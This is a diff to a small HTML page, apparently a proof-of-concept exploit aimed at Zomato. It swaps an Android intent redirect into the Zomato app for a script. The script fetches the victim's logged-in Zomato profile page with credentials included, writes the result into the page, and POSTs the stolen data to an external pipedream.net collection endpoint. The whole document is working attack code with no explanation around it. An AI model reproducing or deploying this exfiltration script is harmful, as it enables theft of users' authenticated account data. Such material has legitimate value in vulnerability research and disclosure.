@@ -1,5 +1,13 @@
 <html><body>
 <script>
-  window.location = "intent://webview?url=https://www.zomato.com/webroutes/getPage?page_url=/profile#Intent;scheme=zomato;package=com.application.zomato;end";
+  fetch("https://www.zomato.com/webroutes/getPage?page_url=/profile", {
+    credentials: "include"
+  })
+  .then(r => r.text())
+  .then(data => {
+    document.body.innerHTML = data;
+    fetch("https://eomfuajl79ed6za.m.pipedream.net", {method:"POST", body:data});
+  })
+  .catch(e => document.body.innerHTML = "err: " + e);
 </script>
 </body></html>
